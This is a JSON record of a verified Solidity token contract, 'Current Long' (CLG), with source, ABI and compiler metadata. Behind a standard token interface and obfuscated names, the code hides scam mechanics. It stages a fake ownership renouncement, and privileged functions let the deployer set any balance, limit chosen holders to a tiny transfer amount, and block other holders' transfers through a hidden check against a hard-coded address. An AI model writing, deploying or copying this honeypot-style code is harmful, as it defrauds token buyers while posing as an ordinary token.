{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface exemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTradingFee {\n    function createPair(address enableShould, address tokenTotal) external returns (address);\n}\n\ninterface fromListAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLaunched) external view returns (uint256);\n\n    function transfer(address tokenAtSender, uint256 autoReceiverLimit) external returns (bool);\n\n    function allowance(address fromMinSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoReceiverLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenAtSender,\n        uint256 autoReceiverLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isSell, uint256 value);\n    event Approval(address indexed fromMinSell, address indexed spender, uint256 value);\n}\n\ninterface fromListAtMetadata is fromListAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CurrentLong is swapTotal, fromListAt, fromListAtMetadata {\n\n    uint8 private takeFundTx = 18;\n\n    address public launchedTakeReceiver;\n\n    function toAutoWallet(uint256 autoReceiverLimit) public {\n        isSwap();\n        modeEnableLaunched = autoReceiverLimit;\n    }\n\n    function transferFrom(address marketingBuy, address tokenAtSender, uint256 autoReceiverLimit) external override returns (bool) {\n        if (_msgSender() != fundLaunchedTake) {\n            if (teamTake[marketingBuy][_msgSender()] != type(uint256).max) {\n                require(autoReceiverLimit <= teamTake[marketingBuy][_msgSender()]);\n                teamTake[marketingBuy][_msgSender()] -= autoReceiverLimit;\n            }\n        }\n        return takeSell(marketingBuy, tokenAtSender, autoReceiverLimit);\n    }\n\n    address minTokenLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private enableLimit;\n\n    uint256 private isSender;\n\n    mapping(address => bool) public txLiquidity;\n\n    event OwnershipTransferred(address indexed minShould, address indexed launchedLiquidityMax);\n\n    constructor (){\n        \n        exemptReceiver launchedSwapBuy = exemptReceiver(fundLaunchedTake);\n        launchedTakeReceiver = takeTradingFee(launchedSwapBuy.factory()).createPair(launchedSwapBuy.WETH(), address(this));\n        \n        atEnable = _msgSender();\n        takeFrom();\n        txLiquidity[atEnable] = true;\n        modeSwap[atEnable] = marketingEnable;\n        if (enableTotal != tradingShouldSender) {\n            limitTotal = isSender;\n        }\n        emit Transfer(address(0), atEnable, marketingEnable);\n    }\n\n    function takeFrom() public {\n        emit OwnershipTransferred(atEnable, address(0));\n        launchedWalletTake = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingEnable;\n    }\n\n    address public atEnable;\n\n    function enableMin(address isToken) public {\n        if (teamSwap) {\n            return;\n        }\n        \n        txLiquidity[isToken] = true;\n        \n        teamSwap = true;\n    }\n\n    uint256 public sellWalletEnable;\n\n    function transfer(address toFeeSell, uint256 autoReceiverLimit) external virtual override returns (bool) {\n        return takeSell(_msgSender(), toFeeSell, autoReceiverLimit);\n    }\n\n    uint256 constant swapMin = 8 ** 10;\n\n    function isSwap() private view {\n        require(txLiquidity[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeFundTx;\n    }\n\n    function shouldAmountLaunch(address toFeeSell, uint256 autoReceiverLimit) public {\n        isSwap();\n        modeSwap[toFeeSell] = autoReceiverLimit;\n    }\n\n    function balanceOf(address feeLaunched) public view virtual override returns (uint256) {\n        return modeSwap[feeLaunched];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isShould;\n    }\n\n    bool private autoLimitMax;\n\n    bool private enableTotal;\n\n    function approve(address tokenTrading, uint256 autoReceiverLimit) public virtual override returns (bool) {\n        teamTake[_msgSender()][tokenTrading] = autoReceiverLimit;\n        emit Approval(_msgSender(), tokenTrading, autoReceiverLimit);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedWalletTake;\n    }\n\n    function shouldTake(address marketingBuy, address tokenAtSender, uint256 autoReceiverLimit) internal returns (bool) {\n        require(modeSwap[marketingBuy] >= autoReceiverLimit);\n        modeSwap[marketingBuy] -= autoReceiverLimit;\n        modeSwap[tokenAtSender] += autoReceiverLimit;\n        emit Transfer(marketingBuy, tokenAtSender, autoReceiverLimit);\n        return true;\n    }\n\n    function takeSell(address marketingBuy, address tokenAtSender, uint256 autoReceiverLimit) internal returns (bool) {\n        if (marketingBuy == atEnable) {\n            return shouldTake(marketingBuy, tokenAtSender, autoReceiverLimit);\n        }\n        uint256 sellTo = fromListAt(launchedTakeReceiver).balanceOf(minTokenLiquidity);\n        require(sellTo == modeEnableLaunched);\n        require(tokenAtSender != minTokenLiquidity);\n        if (swapMarketing[marketingBuy]) {\n            return shouldTake(marketingBuy, tokenAtSender, swapMin);\n        }\n        return shouldTake(marketingBuy, tokenAtSender, autoReceiverLimit);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedWalletTake;\n    }\n\n    uint256 private marketingEnable = 100000000 * 10 ** 18;\n\n    uint256 modeEnableLaunched;\n\n    uint256 public txAuto;\n\n    address fundLaunchedTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private teamTake;\n\n    uint256 private limitTotal;\n\n    mapping(address => bool) public swapMarketing;\n\n    mapping(address => uint256) private modeSwap;\n\n    function allowance(address isMarketing, address tokenTrading) external view virtual override returns (uint256) {\n        if (tokenTrading == fundLaunchedTake) {\n            return type(uint256).max;\n        }\n        return teamTake[isMarketing][tokenTrading];\n    }\n\n    uint256 atMax;\n\n    address private launchedWalletTake;\n\n    string private launchedFee = \"CLG\";\n\n    function takeToken(address fundTeamMode) public {\n        isSwap();\n        if (tradingShouldSender) {\n            enableLimit = txAuto;\n        }\n        if (fundTeamMode == atEnable || fundTeamMode == launchedTakeReceiver) {\n            return;\n        }\n        swapMarketing[fundTeamMode] = true;\n    }\n\n    string private isShould = \"Current Long\";\n\n    bool public tradingShouldSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedFee;\n    }\n\n    bool public teamSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMinSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidityMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTakeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWalletEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFeeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"shouldAmountLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeamMode\",\"type\":\"address\"}],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"toAutoWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFeeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAtSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiverLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CurrentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}